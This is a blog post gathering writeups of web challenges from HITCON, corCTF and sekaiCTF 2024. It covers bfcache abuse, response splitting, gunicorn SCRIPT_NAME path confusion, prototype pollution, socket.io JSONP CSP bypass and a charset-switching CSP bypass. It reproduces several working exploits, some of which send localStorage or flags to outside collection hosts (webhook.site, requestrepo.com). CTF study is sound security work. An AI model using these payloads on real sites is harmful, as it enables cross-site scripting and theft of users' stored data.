---
title: HITCON CTF & corCTF & sekaiCTF 2024 Writeup
date: 2024-09-23 11:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/hitconctf-corctf-sekaictf-2024-writeup/cover-en.png
---

It's been a while since I wrote writeup. I've wanted to write for a long time but kept procrastinating. For something like CTF writeups, speed is quite important because most discussions happen in Discord after the competition. Over time, it's harder to find information, and it's very likely to forget, so I need to quickly write a writeup to record those useful pieces of information.

This article brings together writeups for three CTFs. Some I didn't play myself; I just looked at others' writeups and take a note of them.

Keyword list:

1. bfcache
2. response splitting
3. Service-Worker-Allowed
4. gunicorn script_name
5. socket.io disconnect
6. socket.io JSONP CSP bypass
7. performance API
8. streaming HTML parsing 
9. content-type ISO-2022-JP

<!-- more -->

## HITCON CTF 2024

### Private Browsing+

This challenge is basically a proxy that proxies things under `/~huli/` to other websites, and the response varies based on the header:

``` js
if (
    req.headers['sec-fetch-mode'] &&
    req.headers['sec-fetch-mode'] !== 'navigate' &&
    req.headers['sec-fetch-site'] === 'same-origin'
) {
    req.url = chunks.slice(2).join('/')
    proxy.handler(req, res)
} else {
    res.writeHead(200, { ...DEFAULT_HEADERS, 'content-type': 'text/html' })
    res.end(VIEWER_HTML.replace('SITEB64', btoa(proxy.site)))
}
```

If it's a navigation, it will return VIEWER_HTML, which will perform various sanitizations, so XSS is not possible.

The bypass method is to use bfcache. It appeared in [SECCON CTF 2022 Quals - spanote](https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote). In simple terms, we first visit target.html, at which point the response will be VIEWER_HTML, and within VIEWER_HTML, `fetch('target.html')` will be executed to fetch the content, and at this time the response will be placed in the cache.

Next, we redirect the same tab to our own origin, then execute `history.go(-1)` to redirect the URL back to `target.html`. At this point, due to bfcache, it will load the HTML fetched by `fetch('target.html')`, bypassing the original restrictions and allowing any HTML to be loaded.

But the next issue is CSP: `default-src 'self';`, so scripts can only load from the same origin, but the proxy has restrictions:

``` js
if (
    res.headers['content-type'].toLowerCase().includes('script') ||
    req.headers['sec-fetch-dest'] === 'script'
) {
    res.headers['content-length'] = '0'
    delete res.headers['transfer-encoding']
}
```

If the content type includes script, it directly sets the content-length to 0, so scripts cannot be loaded.

At this point, we need to use response splitting because the proxy will directly pipe the received response out, so we can construct the following flow:

1. The browser sends the first request, let's call it request A.
2. In the response of request A, first output the `expect: '100-continue'` header, allowing the proxy server to output the header. At this point, for the browser, the first request has ended, and it has received the response.
3. The browser sends the second request B, reusing the same connection.
4. At this point, output the response of request B (but for the proxy, it is still the response of request A), bypassing the content type restriction because the proxy thinks this is response content.

In simple terms, it's similar to request smuggling, but done in reverse.

There are two details here:

1. Through Chrome, there is a limit of 6 concurrent requests to the same domain, ensuring that two of the requests will use the same connection.
2. The Node.js server, upon receiving `Expect: 100-continue`, will flush first. This step is necessary to bypass Chrome's restrictions.

Once JS can be loaded, we can use the same method to load the service worker and use the `Service-Worker-Allowed: /` header to expand the scope, allowing registration to the entire origin.


More details can be found in Maple's writeup: https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202024/Private%20Browsing%2B

## corCTF 2024

### web/corctf-challenge-dev - 17 solves
Author: drakon

A challenge related to Chrome extensions, but the author has already written it in detail, so I won't elaborate: [corCTF 2024 - corctf-challenge-dev](https://cor.team/posts/corctf-2024-corctf-challenge-dev/)

### web/iframe-note - 2 solves
Author: sterllic

The core code of this challenge is the following segment:

``` html
<iframe id="iframe"></iframe>
<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
<script src="{{ url_for('static', filename='can.min.js') }}"></script>
<script>
  window.onload = () => {
    if (["__proto__", "constructor", "prototype"].some(d => location.search.includes(d))) {
      return;
    }

    const qs = can.deparam(location.search.slice(1));

    if (!qs.id) {
      alert("no id provided");
      location.href = "/";
    }

    axios.get(`/iframe/${encodeURIComponent(qs.id)}`)
    .then(res => {
      if (res.data.error) {
        alert("no iframe found with that id!");
        return;
      }

      if (!res.data.url.toLowerCase().startsWith("http")) {
        alert("invalid url");
        return;
      }

      document.querySelector("#name").textContent = res.data.name;
      document.querySelector("#iframe").src = res.data.url;
      document.querySelector("#iframe").style = res.data.style;
    });
  }
</script>
```

The backend uses Flask + gunicorn to render the above webpage.

There is a prototype pollution vulnerability in can.js, and even with checks in place, it can still be bypassed using URL encoding. However, the question is what can be done after the pollution occurs.

At first glance, the most suspicious part in the frontend is `document.querySelector("#iframe").src = res.data.url`, but here we need to control the server's response. However, the server has checks in place, so data.url can only start with http.

The final solution is related to the behavior of axios, bfcache, and gunicorn. Gunicorn determines the final path based on the `script_name` in the header. According to the example given in [Gunicorn's handling of PATH_INFO and SCRIPT_NAME can lead to security issues when placed behind a proxy #2650](https://github.com/benoitc/gunicorn/issues/2650):

```python
requests.get(URL+'/REMOVED/admin/something/bad',
             headers={'script_name':'REMOVED/'})
```

If there is an nginx in front that blocks all requests starting with /admin, we can send a request to /REMOVED/admin along with script_name as REMOVED/. Nginx will allow it, but when it reaches gunicorn, it will parse the path as /admin, directly bypassing the previous nginx check.

The part of this challenge that utilizes this behavior is:

```html
<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
```

If you execute `curl https://iframe-note.be.ax////example.com/view -H "SCRIPT_NAME: //example.com"`, the final path will be /view, but the base URL will change, rendering the result as:

```html
<script src="//example.com/static/axios.min.js"></script>
```

This allows direct control over the src on the page.

The author may have been too lazy to set up an instance to host the payload, so they directly used a data URI, turning the script into `<script src="data:text/javascript,{XSS}">`.

To achieve this result, headers need to be sent in the request, so bfcache is utilized. The process is:

1. First visit the final required URL.
2. Redirect to the view page, using prototype pollution to send a request with headers via fetch.
3. Go back to the previous page; at this point, due to bfcache, the response from the previous fetch will be reused, which is the version with headers.
4. XSS

The author's exploit:

``` html
<body>
  <script>
    // const BASE_URL = "http://localhost:3000";
    const BASE_URL = "https://iframe-note.be.ax";

    const HOOK_URL = "https://webhook.site/xxxxx";

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    const main = async () => {
      const dataUrl = `data:text/javascript,navigator.sendBeacon('${HOOK_URL}',JSON.stringify(localStorage))`;

      const win = open(`${BASE_URL}/${dataUrl}/iframe/view`);
      await sleep(1000);

      win.location = `${BASE_URL}/view?id=view&__%70roto__[headers][SCRIPT_NAME]=${dataUrl}/iframe&__%70roto__[baseURL]=/${dataUrl}/`;
      await sleep(1000);

      win.location = `${location.origin}/back.html?n=2`;
    };
    main();
  </script>
</body>
```

``` html
<script>
  const n = parseInt(new URLSearchParams(location.search).get("n"));
  history.go(-n);
</script>
```

### corchat x - 1 solve

Author: larry

A challenge related to socket.io, with three main points:

1. Can send a disconnect event but no actual disconnect occurs.
2. socket.io's JSONP can be used to bypass CSP.
3. Use the performance API to list previously loaded resources.

Below is the exploit posted by EhhThing in Discord:

``` py
import socketio
import requests
import time
import json

base_url = 'https://corchat-x-a6e1f8c45d3ca520.be.ax'

def create_sid():
    session = requests.Session()
    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
    assert login.status_code == 302, login.status_code

    res = session.get(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'bingus',
    })
    assert res.status_code == 200, res.status_code

    socket_session = json.loads(res.text[1:])
    print('fake session', socket_session)

    res = session.post(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'P3qHGUZ',
        'sid': socket_session['sid'],
    }, data = b'40')
    assert res.status_code == 200, res.status_code

    return socket_session['sid']

bot_session = requests.Session()
login = bot_session.post(f'{base_url}/', data = {
    'name': 'FizzBuzz101',
}, allow_redirects=False)
assert login.status_code == 302, login.status_code

sio = socketio.Client(http_session=bot_session)
ready = False

@sio.event
def connect():
    global ready

    print('connected!')

    # fake disconnect event so that the bot can connect as well
    sio.emit('disconnect')
    time.sleep(1)
    ready = True
    print('ready for bot!')

@sio.event
def message(data):
    global ready

    if not ready:
        return

    print('message', data)
    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
        first_sid = create_sid()
        js_payload = """
(window.exfil = data => window.top.opener.top.socket.emit('message', data))
(window.observer = new parent.PerformanceObserver((list) => { list.getEntries().forEach((entry) => { window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); }); }))
(window.observer.observe({ type: 'resource', buffered: true }))
""".strip().replace('\n', ',')
        sio.emit('message', '\\"+'+js_payload+');//')

        second_sid = create_sid()
        jsonp_url = f'{base_url}/socket.io/?EIO=4&transport=polling&t=bingus&sid={second_sid}&j=0'
        js_payload = """
(window.secret=window.open('','secret'))
(window.a=window.top.document.getElementById('xss').cloneNode())
(window.a.srcdoc=window.a.srcdoc.replace('%s','%s'))
(window.secret.document.body.appendChild(window.a))
""".strip().replace('\n', ',') % (second_sid, first_sid)

        sio.emit('message', '\\"+'+js_payload+');//')

        xss_payload = """
<a id=&quot;___eio&quot;></a>
<a id=&quot;___eio&quot;></a>
<script src=&quot;%s&quot;></script>
""" % jsonp_url
        chat_message = '<iframe id="xss" srcdoc="%s"></iframe>' % xss_payload.strip()
        assert len(chat_message) < 400, 'chat message too long, time to write better payload'
        sio.emit('message', chat_message)

sio.connect(base_url)
sio.wait()
```

### web/repayment-pal - 0 solves

Author: strellic

A question related to Next.js, which no one solved during the competition, and no solution was announced afterward.

Below are the hints that were released:

1. +24 hour hint drop: hm, why is dev mode enabled?
2. +36 hour hint drop: try to find a way to get html injection!
3. Post-CTF hint drop: An earlier version of the challenge had an extra check in the middleware, requiring all API requests to have the header Sec-Fetch-Dest: empty


## sekaiCTF 2024

### htmlsandbox (4 solves)

Author: arxenix

Challenge link: https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/web/htmlsandbox

This challenge allows you to upload HTML, but blocks everything it can, and checks if there is: `<meta http-equiv="Content-Security-Policy" content="default-src 'none'">` in the head to ensure that JavaScript code cannot be executed.

The solution is that during the check, the HTML is transformed into `data:text/html` for validation, but when accessed, it is treated as a regular webpage, and the parsing rules for these two are different. When the file is large, the former parses everything at once, while the latter does it chunk by chunk, and each chunk can have different encoding.

Details can be found in the author's writeup: [SekaiCTF'24 htmlsandbox - Author Writeup](https://blog.ankursundara.com/htmlsandbox-writeup/) or in this article [0xalessandro's writeup](https://0xalessandro.github.io/posts/sekai/), where the final exploit looks like this:

```py
import requests

#0xAlessandro was here
c1 = b'''<html><head>
    <!-- \x1b$@ aa -->''' + b'''
<meta http-equiv="Content-Security-Policy" content="default-src 'none'">
\x1b(B <!-- test -->
''' + b"\x1b(B<!-- " + b"A"*64000 + b"-->"+ b"<!--"+b"A"*100+b"-->"

c2 = b'''
    <meta charset="utf-8">
    </head>
    <body>
    <svg><animate onbegin="fetch(`https://s9cs3dwb.requestrepo.com?c=${localStorage.getItem('flag')}`)" attributeName="x" dur="1s">
    </body>
</html>'''

html = c1 + c2
with open('test.html', "wb") as f:
   f.write(html)

r = requests.post('https://htmlsandbox.chals.sekai.team/upload', data={'html': html})
print(r.text)
```

When using a data URI, the entire HTML is parsed as utf-8 without any issues.

However, when accessed as a webpage, it is divided into two chunks, and since `<meta charset="utf-8">` appears in the second chunk, the first chunk is parsed using `JIS X 0208 1983`, causing the CSP to turn into a bunch of garbled characters, which gets removed.

When the second chunk is read and the meta is encountered, it switches to UTF-8 and loads as usual, thus bypassing the CSP and achieving XSS.

The details of this encoding exploit can be referenced here: [Encoding Differentials: Why Charset Matters](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/).
